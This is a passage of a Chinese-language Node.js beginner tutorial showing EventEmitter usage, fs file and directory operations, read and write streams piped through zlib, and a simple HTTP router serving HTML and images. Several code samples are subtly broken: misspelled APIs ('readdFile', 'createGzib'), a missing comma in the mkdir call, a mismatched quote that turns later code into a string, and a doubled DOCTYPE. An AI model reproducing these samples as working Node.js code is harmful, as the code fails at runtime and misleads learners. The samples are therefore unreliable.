class="line"></span><br><span class="line"><span class="comment">// emit订阅事件，传递参数</span></span><br><span class="line">player.emit(<span class="string">'play'</span>,<span class="string">"被风吹过的夏天"</span>)</span><br><span class="line"><span class="comment">//事件定义之后，可以多次触发</span></span><br><span class="line">player.emit(<span class="string">'play'</span>,<span class="string">"朋友请听好"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// once 不论你定义几次，只会触发一次</span></span><br><span class="line">player.once(<span class="string">'play'</span>,<span class="string">"陈情令"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// removeListener 移除指定的监听事件</span></span><br><span class="line"><span class="comment">//player.removeListener('')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// removeAllListeners    移除所有的监听事件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// eventNames方法可以罗列出已注册的所有监听器的事件，类型为数组</span></span><br></pre></td></tr></table></figure><h4 id="5-fs-文件系统"><a href="#5-fs-文件系统" class="headerlink" title="5). fs 文件系统"></a>5). fs 文件系统</h4><p>得到文件与目录信息：<code>stat</code></p><p>创建一个目录：<code>mkdir</code></p><p>创建文件并写入内容：<code>writeFile</code>,<code>appendFile</code></p><p>读取文件的内容：<code>readFile</code></p><p>列出目录的东西：<code>readdir</code></p><p>重命名目录或文件：<code>rename</code></p><p>删除目录与文件：<code>rndir</code>,<code>unlink</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">fs.stat(<span class="string">'index.js'</span>, (error,stats) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(stats);  <span class="comment">//打印文件的一些信息</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`文件：<span class="subst">$&#123;stats.isFile()&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`目录：<span class="subst">$&#123;stats.isDirectory()&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//新建目录</span></span><br><span class="line">fs.mkdir(<span class="string">'logs'</span> (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功创建目录: logs"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 往文件写内容(如果文件不存在，就先创建)</span></span><br><span class="line">fs.writeFile(<span class="string">'logs/hello.log'</span>, <span class="string">"hello ~\n"</span> , (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功向文件logs/hello.log写入内容 "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改文件内容</span></span><br><span class="line">fs.writeFile(<span class="string">'logs/hello.log'</span>, <span class="string">"你好 ~\n"</span> , (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功修改文件logs/hello.log内容 "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 追加文件内容</span></span><br><span class="line">fs.appendFile(<span class="string">'logs/hello.log'</span>, <span class="string">"新添加的一行 ~\n"</span> , (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功添加内容文件logs/hello.log "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件内容</span></span><br><span class="line">fs.readdFile(<span class="string">'logs/hello.log'</span>,<span class="string">'utf8'</span>, (error,data) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功读取文件logs/hello.log内容"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">    <span class="comment">//console.log(data.toString());</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件夹列表</span></span><br><span class="line">fs.readdir(<span class="string">'logs/'</span>, (error,data) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功读取文件夹logs/列表 "</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">    <span class="comment">//console.log(data.toString());</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//对文件重命名  、修改文件夹名字一样</span></span><br><span class="line">fs.rename(<span class="string">'logs/hello.log'</span>, <span class="string">"logs/hello_new.log"</span> , (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'重命名文件名logs/hello.log ");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//循环删除文件</span></span><br><span class="line"><span class="string">fs.readdirSync('</span>logs<span class="string">').map((file) =&gt;&#123;</span></span><br><span class="line"><span class="string">  fs.unlink(`logs/$&#123;file&#125;`, (error) =&gt;&#123;</span></span><br><span class="line"><span class="string">    if(error)&#123;</span></span><br><span class="line"><span class="string">      console.log(error);</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">      console.log(`成功删除文件logs/$&#123;file&#125;`);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;)</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//删除文件夹</span></span><br><span class="line"><span class="string">fs.rmdir('</span>logs<span class="string">',  (error) =&gt;&#123;</span></span><br><span class="line"><span class="string">  if(error)&#123;</span></span><br><span class="line"><span class="string">    console.log(error);</span></span><br><span class="line"><span class="string">  &#125;else&#123;</span></span><br><span class="line"><span class="string">    console.log('</span>成功删除目录:logs/ <span class="string">");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br></pre></td></tr></table></figure><h4 id="6-Stream"><a href="#6-Stream" class="headerlink" title="6). Stream"></a>6). Stream</h4><p>文件流</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fileReadStrem = fs.createReadStream(<span class="string">'data.json'</span>)</span><br><span class="line"><span class="keyword">var</span> fileWriteStrem = fs.createWriteStream(<span class="string">'data1.json'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件流</span></span><br><span class="line">fileReadStrem.once(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(chunk.toString());</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fileReadStrem.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123; ++count &#125;</span> 接收到：<span class="subst">$&#123;chunk.length&#125;</span>`</span>);</span><br><span class="line">  <span class="comment">//写入文件流</span></span><br><span class="line">  fileWriteStrem.write(chunk)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fileReadStrem.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"-- 结束  --"</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fileReadStrem.on(<span class="string">'error'</span>, (error) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>pipe </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> zlib = <span class="built_in">require</span>(<span class="string">'zlib'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fileReadStrem = fs.createReadStream(<span class="string">'data.json'</span>)</span><br><span class="line"><span class="keyword">var</span> fileWriteStrem = fs.createWriteStream(<span class="string">'data1.json'</span>)</span><br><span class="line"></span><br><span class="line">fileWriteStrem.on(<span class="string">'pipe'</span>, (source) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(source); <span class="comment">//将写入的内容通过管道打印一下</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件流的内容放到文件写入流   管道</span></span><br><span class="line">fileReadStrem</span><br><span class="line">  .pipe(zlib.createGzib())</span><br><span class="line">  .pipe(fileWriteStrem)</span><br></pre></td></tr></table></figure><h2 id="五-使用Node创建后端路由"><a href="#五-使用Node创建后端路由" class="headerlink" title="五.使用Node创建后端路由"></a>五.使用Node创建后端路由</h2><p><strong>使用supervisor运行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装：</span></span><br><span class="line">npm install supervisor -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">supervisor router_1.js</span><br></pre></td></tr></table></figure><p><strong>最简单路由</strong></p><p>router_1.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> route = <span class="built_in">require</span>(<span class="string">'./modules/route.js'</span>)</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'text/html;charset=utf-8'</span>&#125;)</span><br><span class="line">  <span class="keyword">if</span>(req.url !== <span class="string">'/favicon.ico'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pathName = url.parse(req.url).pathname.replace(<span class="regexp">/\//</span>,<span class="string">''</span>) <span class="comment">//http://localhost:8000/login就是login</span></span><br><span class="line">    <span class="built_in">console</span>.log(pathName);</span><br><span class="line">    <span class="keyword">try</span>&#123;  <span class="comment">//最简单的异常处理</span></span><br><span class="line">      route[pathName](req, res)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">      route[<span class="string">'home'</span>](req, res)  <span class="comment">//默认路由，如果不存在哪个路由，就返回这个路由</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res.end()</span><br><span class="line">&#125;).listen(<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://localhost:8000'</span>);</span><br></pre></td></tr></table></figure><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  home: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"欢迎来到首页"</span>)  <span class="comment">// 默认路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"登录界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  registor: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"注册界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>读取图片</strong></p><p>router_02.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> route = <span class="built_in">require</span>(<span class="string">'./modules/route.js'</span>)</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'image/jpeg'</span>&#125;)</span><br><span class="line">  <span class="keyword">if</span>(req.url !== <span class="string">'/favicon.ico'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pathName = url.parse(req.url).pathname.replace(<span class="regexp">/\//</span>,<span class="string">''</span>) <span class="comment">//http://localhost:8000/login就是login</span></span><br><span class="line">    <span class="built_in">console</span>.log(pathName);</span><br><span class="line">    <span class="keyword">try</span>&#123;  <span class="comment">//最简单的异常处理</span></span><br><span class="line">      route[pathName](req, res)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">      route[<span class="string">'home'</span>](req, res)  <span class="comment">//默认路由，如果不存在哪个路由，就返回这个路由</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//res.end()</span></span><br><span class="line">&#125;).listen(<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://localhost:8000'</span>);</span><br></pre></td></tr></table></figure><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="built_in">require</span>(<span class="string">'./file.js'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  home: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"欢迎来到首页"</span>)  <span class="comment">// 默认路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"登录界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  registor: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"注册界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  img: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//读取文件，也新建一个模块</span></span><br><span class="line">    file.readImg(<span class="string">'./images/1.jpg'</span>, res)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>file.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  readImg: <span class="function">(<span class="params">file, res</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(file, <span class="string">'binary'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">      res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'image/jpeg'</span>&#125;)</span><br><span class="line">      res.write(data, <span class="string">'binary'</span>)</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>文字和图片一起显示</strong></p><p>使用html文件</p><p>views/home.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    首页</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>file.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">//读html文件</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  readFile: <span class="function">(<span class="params">file, res</span>) =&gt;</span> &#123; </span><br><span class="line">    fs.readFile(file, <span class="string">'utf-8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">          res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'text/html; charset=utf-8'</span>&#125;)</span><br><span class="line">          res.write(data)</span><br><span class="line">          res.end()</span><br><span class="line">  &#125;)&#125;,</span><br><span class="line">  readImg: <span class="function">(<span class="params">file, res</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(file, <span class="string">'binary'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">      res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'image/jpeg'</span>&#125;)</span><br><span class="line">      res.write(data, <span class="string">'binary'</span>)</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="built_in">require</span>(<span class="string">'./file.js'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  home: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//res.write("欢迎来到首页")  // 默认路由</span></span><br><span class="line">    file.readFile(<span class="string">'./views/home.html'</span>, res)</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"登录界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  registor: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"注册界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  img: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//读取文件，也新建一个模块</span></span><br><span class="line">    file.readImg(<span class="string">'./images/1.jpg'</span>, res)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>router_03.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> route = <span class="built_in">require</span>(<span class="string">'./modules/route.js'</span>)</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.url !== <span class="string">'/favicon.ico'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pathName = url.parse(req.url).pathname.replace(<span class="regexp">/\//</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(pathName);</span><br><span class="line">    <span class="keyword">try</span>&#123;  <span class="comment">//最简单的异常处理</span></span><br><span class="line">      route[pathName](req, res)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">      route[<span class="string">'home'</span>](req, res)  <span class="comment">//默认路由，如果不存在哪个路由，就返回这个路由</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//res.end()</span></span><br><span class="line">&#125;).listen(<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://localhost:8000'</span>);</span><br></pre></td></tr></table></figure><h6 id="路由传递参数"><a href="#路由传递参数" class="headerlink" title="路由传递参数"></a>路由传递参数</h6><p><strong>1.get方式</strong></p><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 